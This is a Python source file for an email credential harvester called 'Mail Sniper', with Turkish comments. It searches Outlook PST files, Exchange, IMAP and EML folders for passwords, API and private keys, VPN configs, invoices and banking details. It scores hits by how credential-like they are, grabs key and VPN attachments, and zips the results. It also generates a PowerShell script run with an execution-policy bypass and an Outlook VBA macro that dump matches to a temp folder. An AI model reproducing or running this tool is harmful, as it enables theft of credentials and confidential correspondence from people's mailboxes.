#!/usr/bin/env python3
"""
Mail Sniper - Email Keyword Harvester
======================================
Outlook/Exchange içinde "Password", "Fatura", "VPN", "Config" 
gibi anahtar kelimeleri tarat, sadece eşleşenleri export et ve zipple.

Author: CyberPunk Team
Version: 1.0.0 PRO
"""

import os
import re
import json
import zipfile
import tempfile
import hashlib
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set, Tuple, Any
from enum import Enum
import email
from email.header import decode_header
import base64


class EmailSource(Enum):
    """Supported email sources"""
    OUTLOOK_LOCAL = "Outlook (Local PST/OST)"
    OUTLOOK_COM = "Outlook.com/Office365"
    EXCHANGE = "Exchange Server"
    GMAIL = "Gmail"
    IMAP = "Generic IMAP"
    EML_FILES = "EML Files"


class ContentType(Enum):
    """Email content types"""
    BODY = "body"
    SUBJECT = "subject"
    ATTACHMENT = "attachment"
    ATTACHMENT_CONTENT = "attachment_content"


@dataclass
class KeywordMatch:
    """Keyword match in email content"""
    keyword: str
    context: str  # Surrounding text
    location: ContentType
    line_number: int = 0
    score: float = 1.0  # Relevance score
    
    def to_dict(self) -> Dict:
        return {
            "keyword": self.keyword,
            "context": self.context,
            "location": self.location.value,
            "line_number": self.line_number,
            "score": self.score
        }


@dataclass
class EmailAttachment:
    """Email attachment information"""
    filename: str
    size: int
    content_type: str
    content: bytes = field(default=b"", repr=False)
    keywords_found: List[KeywordMatch] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            "filename": self.filename,
            "size": self.size,
            "content_type": self.content_type,
            "keywords_found": [k.to_dict() for k in self.keywords_found]
        }


@dataclass
class EmailMessage:
    """Extracted email message"""
    message_id: str
    subject: str
    sender: str
    recipients: List[str]
    cc: List[str] = field(default_factory=list)
    bcc: List[str] = field(default_factory=list)
    date: Optional[datetime] = None
    body_text: str = ""
    body_html: str = ""
    attachments: List[EmailAttachment] = field(default_factory=list)
    keywords_found: List[KeywordMatch] = field(default_factory=list)
    source: EmailSource = EmailSource.EML_FILES
    folder: str = "Inbox"
    is_read: bool = True
    has_attachments: bool = False
    extracted_at: str = field(default_factory=lambda: datetime.now().isoformat())
    
    @property
    def total_matches(self) -> int:
        return len(self.keywords_found) + sum(
            len(a.keywords_found) for a in self.attachments
        )
    
    @property
    def relevance_score(self) -> float:
        if not self.keywords_found:
            return 0.0
        return sum(k.score for k in self.keywords_found) / len(self.keywords_found)
    
    def to_dict(self) -> Dict:
        return {
            "message_id": self.message_id,
            "subject": self.subject,
            "sender": self.sender,
            "recipients": self.recipients,
            "cc": self.cc,
            "date": self.date.isoformat() if self.date else None,
            "folder": self.folder,
            "body_preview": self.body_text[:500] if self.body_text else "",
            "attachments": [a.to_dict() for a in self.attachments],
            "keywords_found": [k.to_dict() for k in self.keywords_found],
            "total_matches": self.total_matches,
            "relevance_score": self.relevance_score,
            "source": self.source.value
        }
    
    def to_eml(self) -> str:
        """Convert to EML format"""
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        
        msg = MIMEMultipart()
        msg['Subject'] = self.subject
        msg['From'] = self.sender
        msg['To'] = ', '.join(self.recipients)
        if self.cc:
            msg['Cc'] = ', '.join(self.cc)
        if self.date:
            msg['Date'] = self.date.strftime("%a, %d %b %Y %H:%M:%S %z")
        
        # Add body
        if self.body_html:
            msg.attach(MIMEText(self.body_html, 'html'))
        elif self.body_text:
            msg.attach(MIMEText(self.body_text, 'plain'))
        
        return msg.as_string()


@dataclass
class SearchQuery:
    """Email search query configuration"""
    keywords: List[str]
    folders: List[str] = field(default_factory=lambda: ["Inbox", "Sent Items"])
    date_from: Optional[datetime] = None
    date_to: Optional[datetime] = None
    sender_filter: Optional[str] = None
    has_attachment: Optional[bool] = None
    subject_only: bool = False
    case_sensitive: bool = False
    regex_enabled: bool = False
    max_results: int = 1000
    
    def to_dict(self) -> Dict:
        return {
            "keywords": self.keywords,
            "folders": self.folders,
            "date_from": self.date_from.isoformat() if self.date_from else None,
            "date_to": self.date_to.isoformat() if self.date_to else None,
            "sender_filter": self.sender_filter,
            "has_attachment": self.has_attachment,
            "subject_only": self.subject_only,
            "case_sensitive": self.case_sensitive,
            "max_results": self.max_results
        }


class MailSniper:
    """
    Mail Sniper - Email Keyword Harvester
    =====================================
    Search Outlook/Exchange for sensitive keywords and extract matching emails.
    
    Features:
    - Search Outlook PST/OST files
    - Connect to Exchange/Office365
    - Keyword search with regex support
    - Attachment content search
    - Export to ZIP archive
    """
    
    # Default sensitive keywords
    DEFAULT_KEYWORDS = [
        # Authentication
        "password", "şifre", "parola", "credentials", "kimlik",
        "secret", "api key", "api_key", "apikey", "access token",
        "private key", "ssh key", "certificate",
        
        # Financial
        "fatura", "invoice", "ödeme", "payment", "banka", "bank",
        "iban", "swift", "kredi kartı", "credit card", "hesap",
        
        # Network/VPN
        "vpn", "remote access", "uzaktan erişim", "rdp", "ssh",
        "firewall", "network", "ağ", "ip address",
        
        # Configuration
        "config", "configuration", "yapılandırma", "ayar", "settings",
        "connection string", "database", "veritabanı",
        
        # Internal
        "confidential", "gizli", "internal only", "dahili",
        "restricted", "kısıtlı", "sensitive", "hassas"
    ]
    
    # High-value attachment extensions
    INTERESTING_EXTENSIONS = [
        '.pst', '.ost', '.msg', '.eml',
        '.doc', '.docx', '.xls', '.xlsx', '.pdf',
        '.txt', '.csv', '.json', '.xml', '.yaml', '.yml',
        '.conf', '.config', '.cfg', '.ini',
        '.key', '.pem', '.p12', '.pfx', '.crt',
        '.rdp', '.ovpn', '.ppk'
    ]
    
    def __init__(self, keywords: List[str] = None):
        self.keywords = keywords or self.DEFAULT_KEYWORDS
        self.messages: List[EmailMessage] = []
        self.search_results: List[EmailMessage] = []
        self._temp_dir = tempfile.mkdtemp(prefix='mailsniper_')
    
    def add_keywords(self, keywords: List[str]):
        """Add additional keywords to search"""
        self.keywords.extend(keywords)
        self.keywords = list(set(self.keywords))  # Remove duplicates
    
    def _find_keywords(self, text: str, location: ContentType, 
                       case_sensitive: bool = False,
                       regex_enabled: bool = False) -> List[KeywordMatch]:
        """Find keywords in text"""
        matches = []
        
        if not text:
            return matches
        
        search_text = text if case_sensitive else text.lower()
        
        for keyword in self.keywords:
            search_keyword = keyword if case_sensitive else keyword.lower()
            
            if regex_enabled:
                try:
                    pattern = re.compile(search_keyword, 
                                        re.IGNORECASE if not case_sensitive else 0)
                    for match in pattern.finditer(text):
                        start = max(0, match.start() - 50)
                        end = min(len(text), match.end() + 50)
                        context = text[start:end].strip()
                        
                        matches.append(KeywordMatch(
                            keyword=keyword,
                            context=context,
                            location=location,
                            score=self._calculate_relevance(keyword, context)
                        ))
                except re.error:
                    pass
            else:
                if search_keyword in search_text:
                    # Find all occurrences
                    start = 0
                    while True:
                        idx = search_text.find(search_keyword, start)
                        if idx == -1:
                            break
                        
                        context_start = max(0, idx - 50)
                        context_end = min(len(text), idx + len(keyword) + 50)
                        context = text[context_start:context_end].strip()
                        
                        # Calculate line number
                        line_num = text[:idx].count('\n') + 1
                        
                        matches.append(KeywordMatch(
                            keyword=keyword,
                            context=context,
                            location=location,
                            line_number=line_num,
                            score=self._calculate_relevance(keyword, context)
                        ))
                        
                        start = idx + 1
        
        return matches
    
    def _calculate_relevance(self, keyword: str, context: str) -> float:
        """Calculate relevance score for a match"""
        score = 1.0
        
        # Boost for certain keywords
        high_value_keywords = ['password', 'şifre', 'api key', 'private key', 'secret']
        if keyword.lower() in high_value_keywords:
            score *= 1.5
        
        # Boost if context contains additional indicators
        context_lower = context.lower()
        if any(x in context_lower for x in [':', '=', 'is', '->','"']):
            score *= 1.3
        
        # Boost if looks like actual credential
        if re.search(r'[a-zA-Z0-9]{16,}', context):
            score *= 1.4
        
        return min(score, 3.0)  # Cap at 3.0
    
    def parse_eml_file(self, file_path: str) -> Optional[EmailMessage]:
        """Parse an EML file"""
        try:
            with open(file_path, 'rb') as f:
                msg = email.message_from_bytes(f.read())
            
            return self._parse_email_message(msg, EmailSource.EML_FILES)
            
        except Exception as e:
            return None
    
    def _parse_email_message(self, msg: email.message.Message, 
                            source: EmailSource) -> EmailMessage:
        """Parse email.message.Message object"""
        
        # Decode subject
        subject = ""
        if msg['Subject']:
            decoded = decode_header(msg['Subject'])
            subject = ''.join(
                part.decode(encoding or 'utf-8') if isinstance(part, bytes) else part
                for part, encoding in decoded
            )
        
        # Parse sender
        sender = msg['From'] or ""
        
        # Parse recipients
        recipients = []
        if msg['To']:
            recipients = [r.strip() for r in msg['To'].split(',')]
        
        # Parse CC
        cc = []
        if msg['Cc']:
            cc = [c.strip() for c in msg['Cc'].split(',')]
        
        # Parse date
        date = None
        if msg['Date']:
            try:
                from email.utils import parsedate_to_datetime
                date = parsedate_to_datetime(msg['Date'])
            except Exception:
                pass
        
        # Extract body
        body_text = ""
        body_html = ""
        attachments = []
        
        if msg.is_multipart():
            for part in msg.walk():
                content_type = part.get_content_type()
                disposition = str(part.get('Content-Disposition', ''))
                
                if 'attachment' in disposition:
                    # Handle attachment
                    filename = part.get_filename() or "attachment"
                    content = part.get_payload(decode=True) or b""
                    
                    attachment = EmailAttachment(
                        filename=filename,
                        size=len(content),
                        content_type=content_type,
                        content=content
                    )
                    attachments.append(attachment)
                    
                elif content_type == 'text/plain':
                    body_text = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                    
                elif content_type == 'text/html':
                    body_html = part.get_payload(decode=True).decode('utf-8', errors='ignore')
        else:
            payload = msg.get_payload(decode=True)
            if payload:
                body_text = payload.decode('utf-8', errors='ignore')
        
        # Generate message ID
        message_id = msg['Message-ID'] or hashlib.md5(
            f"{subject}{sender}{date}".encode()
        ).hexdigest()
        
        return EmailMessage(
            message_id=message_id,
            subject=subject,
            sender=sender,
            recipients=recipients,
            cc=cc,
            date=date,
            body_text=body_text,
            body_html=body_html,
            attachments=attachments,
            source=source,
            has_attachments=len(attachments) > 0
        )
    
    def search_message(self, message: EmailMessage, query: SearchQuery) -> bool:
        """Search a single message for keywords"""
        message.keywords_found = []
        
        # Search subject
        subject_matches = self._find_keywords(
            message.subject, 
            ContentType.SUBJECT,
            query.case_sensitive,
            query.regex_enabled
        )
        message.keywords_found.extend(subject_matches)
        
        if query.subject_only:
            return len(message.keywords_found) > 0
        
        # Search body
        body_text = message.body_text
        if not body_text and message.body_html:
            # Strip HTML tags for searching
            body_text = re.sub(r'<[^>]+>', ' ', message.body_html)
        
        body_matches = self._find_keywords(
            body_text,
            ContentType.BODY,
            query.case_sensitive,
            query.regex_enabled
        )
        message.keywords_found.extend(body_matches)
        
        # Search attachments
        for attachment in message.attachments:
            # Check filename
            filename_matches = self._find_keywords(
                attachment.filename,
                ContentType.ATTACHMENT,
                query.case_sensitive,
                query.regex_enabled
            )
            attachment.keywords_found.extend(filename_matches)
            
            # Check if interesting extension
            ext = os.path.splitext(attachment.filename.lower())[1]
            if ext in self.INTERESTING_EXTENSIONS:
                # Mark as interesting even without keyword match
                if not attachment.keywords_found:
                    attachment.keywords_found.append(KeywordMatch(
                        keyword=f"[Interesting file: {ext}]",
                        context=attachment.filename,
                        location=ContentType.ATTACHMENT,
                        score=0.5
                    ))
            
            # Search attachment content for text files
            if attachment.content and ext in ['.txt', '.csv', '.json', '.xml', 
                                               '.yaml', '.yml', '.conf', '.config',
                                               '.cfg', '.ini']:
                try:
                    text_content = attachment.content.decode('utf-8', errors='ignore')
                    content_matches = self._find_keywords(
                        text_content,
                        ContentType.ATTACHMENT_CONTENT,
                        query.case_sensitive,
                        query.regex_enabled
                    )
                    attachment.keywords_found.extend(content_matches)
                except Exception:
                    pass
        
        return message.total_matches > 0
    
    def search_directory(self, directory: str, query: SearchQuery) -> List[EmailMessage]:
        """Search all EML files in a directory"""
        results = []
        
        for root, dirs, files in os.walk(directory):
            for filename in files:
                if filename.lower().endswith('.eml'):
                    file_path = os.path.join(root, filename)
                    message = self.parse_eml_file(file_path)
                    
                    if message and self.search_message(message, query):
                        results.append(message)
                        
                        if len(results) >= query.max_results:
                            return results
        
        self.search_results = results
        return results
    
    def search_pst_file(self, pst_path: str, query: SearchQuery) -> List[EmailMessage]:
        """Search Outlook PST file (requires pypff library)"""
        results = []
        
        try:
            import pypff
            
            pst = pypff.file()
            pst.open(pst_path)
            
            root = pst.get_root_folder()
            self._search_pst_folder(root, query, results)
            
            pst.close()
            
        except ImportError:
            # pypff not available, return empty
            pass
        except Exception:
            pass
        
        self.search_results = results
        return results
    
    def _search_pst_folder(self, folder, query: SearchQuery, 
                          results: List[EmailMessage]):
        """Recursively search PST folder"""
        folder_name = folder.name or "Root"
        
        # Check if folder is in query folders
        if query.folders and folder_name not in query.folders:
            # Still recurse into subfolders
            for i in range(folder.number_of_sub_folders):
                self._search_pst_folder(folder.get_sub_folder(i), query, results)
            return
        
        # Search messages in this folder
        for i in range(folder.number_of_sub_messages):
            if len(results) >= query.max_results:
                return
            
            try:
                msg = folder.get_sub_message(i)
                
                # Parse message
                email_msg = EmailMessage(
                    message_id=msg.identifier or str(i),
                    subject=msg.subject or "",
                    sender=msg.sender_name or "",
                    recipients=[msg.display_to or ""],
                    date=msg.delivery_time,
                    body_text=msg.plain_text_body or "",
                    body_html=msg.html_body or "",
                    source=EmailSource.OUTLOOK_LOCAL,
                    folder=folder_name
                )
                
                # Search message
                if self.search_message(email_msg, query):
                    results.append(email_msg)
                    
            except Exception:
                continue
        
        # Recurse into subfolders
        for i in range(folder.number_of_sub_folders):
            self._search_pst_folder(folder.get_sub_folder(i), query, results)
    
    def connect_exchange(self, server: str, username: str, password: str,
                        domain: str = None) -> bool:
        """Connect to Exchange server using EWS"""
        try:
            from exchangelib import Credentials, Account, Configuration
            from exchangelib import DELEGATE
            
            if domain:
                username = f"{domain}\\{username}"
            
            credentials = Credentials(username=username, password=password)
            config = Configuration(server=server, credentials=credentials)
            
            self._exchange_account = Account(
                primary_smtp_address=username,
                config=config,
                autodiscover=False,
                access_type=DELEGATE
            )
            
            return True
            
        except Exception:
            return False
    
    def search_exchange(self, query: SearchQuery) -> List[EmailMessage]:
        """Search Exchange mailbox"""
        results = []
        
        if not hasattr(self, '_exchange_account'):
            return results
        
        try:
            from exchangelib import Q
            
            account = self._exchange_account
            
            # Build search filter
            q = None
            for keyword in query.keywords:
                keyword_q = Q(body__contains=keyword) | Q(subject__contains=keyword)
                q = keyword_q if q is None else q | keyword_q
            
            # Add date filters
            if query.date_from:
                q = q & Q(datetime_received__gte=query.date_from)
            if query.date_to:
                q = q & Q(datetime_received__lte=query.date_to)
            
            # Search folders
            for folder_name in query.folders:
                try:
                    folder = getattr(account, folder_name.lower().replace(' ', '_'), None)
                    if not folder:
                        continue
                    
                    for item in folder.filter(q).order_by('-datetime_received')[:query.max_results]:
                        email_msg = EmailMessage(
                            message_id=item.message_id or item.id,
                            subject=item.subject or "",
                            sender=str(item.sender) if item.sender else "",
                            recipients=[str(r) for r in (item.to_recipients or [])],
                            cc=[str(r) for r in (item.cc_recipients or [])],
                            date=item.datetime_received,
                            body_text=item.text_body or "",
                            body_html=item.body or "",
                            source=EmailSource.EXCHANGE,
                            folder=folder_name,
                            is_read=item.is_read,
                            has_attachments=item.has_attachments
                        )
                        
                        # Process attachments
                        if item.has_attachments:
                            for attachment in item.attachments:
                                att = EmailAttachment(
                                    filename=attachment.name or "attachment",
                                    size=attachment.size or 0,
                                    content_type=attachment.content_type or "",
                                    content=attachment.content or b""
                                )
                                email_msg.attachments.append(att)
                        
                        # Search for keywords
                        if self.search_message(email_msg, query):
                            results.append(email_msg)
                            
                        if len(results) >= query.max_results:
                            break
                            
                except Exception:
                    continue
            
        except Exception:
            pass
        
        self.search_results = results
        return results
    
    def connect_imap(self, server: str, username: str, password: str,
                    port: int = 993, use_ssl: bool = True) -> bool:
        """Connect to IMAP server"""
        try:
            import imaplib
            
            if use_ssl:
                self._imap = imaplib.IMAP4_SSL(server, port)
            else:
                self._imap = imaplib.IMAP4(server, port)
            
            self._imap.login(username, password)
            return True
            
        except Exception:
            return False
    
    def search_imap(self, query: SearchQuery) -> List[EmailMessage]:
        """Search IMAP mailbox"""
        results = []
        
        if not hasattr(self, '_imap'):
            return results
        
        try:
            imap = self._imap
            
            for folder in query.folders:
                try:
                    status, _ = imap.select(folder)
                    if status != 'OK':
                        continue
                    
                    # Build search criteria
                    for keyword in query.keywords:
                        search_criteria = f'(OR SUBJECT "{keyword}" BODY "{keyword}")'
                        
                        status, message_nums = imap.search(None, search_criteria)
                        if status != 'OK':
                            continue
                        
                        for num in message_nums[0].split()[:query.max_results]:
                            status, msg_data = imap.fetch(num, '(RFC822)')
                            if status != 'OK':
                                continue
                            
                            raw_email = msg_data[0][1]
                            msg = email.message_from_bytes(raw_email)
                            
                            email_msg = self._parse_email_message(msg, EmailSource.IMAP)
                            email_msg.folder = folder
                            
                            if self.search_message(email_msg, query):
                                results.append(email_msg)
                            
                            if len(results) >= query.max_results:
                                return results
                                
                except Exception:
                    continue
                    
        except Exception:
            pass
        
        self.search_results = results
        return results
    
    def export_results(self, output_dir: str = None) -> str:
        """Export search results to JSON and individual files"""
        output_dir = output_dir or self._temp_dir
        os.makedirs(output_dir, exist_ok=True)
        
        # Export summary JSON
        summary = {
            "export_date": datetime.now().isoformat(),
            "total_results": len(self.search_results),
            "keywords_searched": self.keywords,
            "messages": [m.to_dict() for m in self.search_results]
        }
        
        summary_path = os.path.join(output_dir, "search_results.json")
        with open(summary_path, 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)
        
        # Export individual messages
        messages_dir = os.path.join(output_dir, "messages")
        os.makedirs(messages_dir, exist_ok=True)
        
        for i, msg in enumerate(self.search_results):
            # Save as EML
            eml_path = os.path.join(messages_dir, f"message_{i+1}.eml")
            with open(eml_path, 'w', encoding='utf-8') as f:
                f.write(msg.to_eml())
            
            # Save attachments
            if msg.attachments:
                att_dir = os.path.join(messages_dir, f"message_{i+1}_attachments")
                os.makedirs(att_dir, exist_ok=True)
                
                for att in msg.attachments:
                    if att.content:
                        att_path = os.path.join(att_dir, att.filename)
                        with open(att_path, 'wb') as f:
                            f.write(att.content)
        
        return output_dir
    
    def create_zip_archive(self, output_path: str = None) -> str:
        """Create ZIP archive of search results"""
        # First export results
        export_dir = self.export_results()
        
        # Create ZIP
        output_path = output_path or os.path.join(
            self._temp_dir, 
            f"mail_sniper_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        )
        
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(export_dir):
                for filename in files:
                    file_path = os.path.join(root, filename)
                    arcname = os.path.relpath(file_path, export_dir)
                    zf.write(file_path, arcname)
        
        return output_path
    
    def get_statistics(self) -> Dict:
        """Get search statistics"""
        total_matches = sum(m.total_matches for m in self.search_results)
        
        keyword_counts = {}
        for msg in self.search_results:
            for match in msg.keywords_found:
                keyword_counts[match.keyword] = keyword_counts.get(match.keyword, 0) + 1
        
        top_keywords = sorted(keyword_counts.items(), key=lambda x: x[1], reverse=True)[:10]
        
        sources = {}
        for msg in self.search_results:
            source = msg.source.value
            sources[source] = sources.get(source, 0) + 1
        
        with_attachments = sum(1 for m in self.search_results if m.has_attachments)
        
        return {
            "total_messages": len(self.search_results),
            "total_keyword_matches": total_matches,
            "top_keywords": dict(top_keywords),
            "sources": sources,
            "messages_with_attachments": with_attachments,
            "average_relevance_score": sum(m.relevance_score for m in self.search_results) / max(len(self.search_results), 1)
        }
    
    def generate_powershell_sniper(self) -> str:
        """Generate PowerShell script for Outlook search"""
        keywords_list = "', '".join(self.keywords[:10])
        
        return f'''
# Mail Sniper - PowerShell (Outlook COM)
# Run with: powershell -ExecutionPolicy Bypass -File mailsniper.ps1

$keywords = @('{keywords_list}')
$results = @()

Add-Type -AssemblyName "Microsoft.Office.Interop.Outlook"
$outlook = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")

function Search-Folder($folder, $keywords) {{
    Write-Host "[*] Searching folder: $($folder.Name)" -ForegroundColor Cyan
    
    foreach ($keyword in $keywords) {{
        $filter = "[Body] LIKE '%$keyword%' OR [Subject] LIKE '%$keyword%'"
        
        try {{
            $items = $folder.Items.Restrict($filter)
            
            foreach ($item in $items) {{
                $script:results += [PSCustomObject]@{{
                    Subject = $item.Subject
                    Sender = $item.SenderName
                    ReceivedTime = $item.ReceivedTime
                    Keyword = $keyword
                    HasAttachments = $item.Attachments.Count -gt 0
                    Folder = $folder.Name
                }}
            }}
        }} catch {{
            Write-Warning "Error searching: $_"
        }}
    }}
    
    # Recurse into subfolders
    foreach ($subfolder in $folder.Folders) {{
        Search-Folder -folder $subfolder -keywords $keywords
    }}
}}

# Search all folders
foreach ($folder in $namespace.Folders) {{
    Search-Folder -folder $folder -keywords $keywords
}}

Write-Host "[+] Found $($results.Count) matching emails" -ForegroundColor Green
$results | Export-Csv -Path "$env:TEMP\\mail_sniper_results.csv" -NoTypeInformation
$results | ConvertTo-Json | Out-File "$env:TEMP\\mail_sniper_results.json"

Write-Host "[+] Results saved to $env:TEMP\\mail_sniper_results.json" -ForegroundColor Green
'''

    def generate_vba_macro(self) -> str:
        """Generate VBA macro for Outlook search"""
        keywords_vba = '", "'.join(self.keywords[:5])
        
        return f'''
' Mail Sniper VBA Macro for Outlook
' Add this to Outlook VBA (Alt+F11)

Sub MailSniper()
    Dim olApp As Outlook.Application
    Dim olNs As Outlook.Namespace
    Dim olFolder As Outlook.MAPIFolder
    Dim olItems As Outlook.Items
    Dim olItem As Object
    Dim keywords As Variant
    Dim keyword As Variant
    Dim results As String
    
    keywords = Array("{keywords_vba}")
    results = "Subject,Sender,Date,Keyword" & vbCrLf
    
    Set olApp = Outlook.Application
    Set olNs = olApp.GetNamespace("MAPI")
    Set olFolder = olNs.GetDefaultFolder(olFolderInbox)
    
    For Each keyword In keywords
        Set olItems = olFolder.Items.Restrict( _
            "[Body] LIKE '%" & keyword & "%' OR " & _
            "[Subject] LIKE '%" & keyword & "%'")
        
        For Each olItem In olItems
            If TypeName(olItem) = "MailItem" Then
                results = results & _
                    Replace(olItem.Subject, ",", ";") & "," & _
                    olItem.SenderName & "," & _
                    olItem.ReceivedTime & "," & _
                    keyword & vbCrLf
            End If
        Next olItem
    Next keyword
    
    ' Save results
    Dim fso As Object, f As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.CreateTextFile(Environ("TEMP") & "\\mail_sniper.csv", True)
    f.Write results
    f.Close
    
    MsgBox "Search complete! Results saved to %TEMP%\\mail_sniper.csv"
End Sub
'''

    def cleanup(self):
        """Clean up temporary files"""
        import shutil
        try:
            shutil.rmtree(self._temp_dir, ignore_errors=True)
        except Exception:
            pass


# Singleton instance
_sniper = None

def get_sniper(keywords: List[str] = None) -> MailSniper:
    """Get singleton sniper instance"""
    global _sniper
    if _sniper is None:
        _sniper = MailSniper(keywords)
    return _sniper


def demo():
    """Demonstrate Mail Sniper capabilities"""
    print("=" * 60)
    print("Mail Sniper - Email Keyword Harvester")
    print("=" * 60)
    
    sniper = get_sniper()
    
    print("\n[*] Default keywords:")
    for i, kw in enumerate(sniper.DEFAULT_KEYWORDS[:10]):
        print(f"    {i+1}. {kw}")
    print(f"    ... and {len(sniper.DEFAULT_KEYWORDS) - 10} more")
    
    print("\n[*] Supported sources:")
    for source in EmailSource:
        print(f"    - {source.value}")
    
    print("\n[*] Interesting attachment types:")
    print(f"    {', '.join(sniper.INTERESTING_EXTENSIONS)}")
    
    print("\n[*] Export formats:")
    print("    - JSON (search_results.json)")
    print("    - EML files (individual messages)")
    print("    - ZIP archive (complete package)")
    
    print("\n[*] PowerShell sniper preview:")
    print("-" * 40)
    ps_preview = sniper.generate_powershell_sniper()[:500]
    print(ps_preview + "...")
    
    print("\n[*] Ready for email hunting")
    print("-" * 60)


if __name__ == "__main__":
    demo()
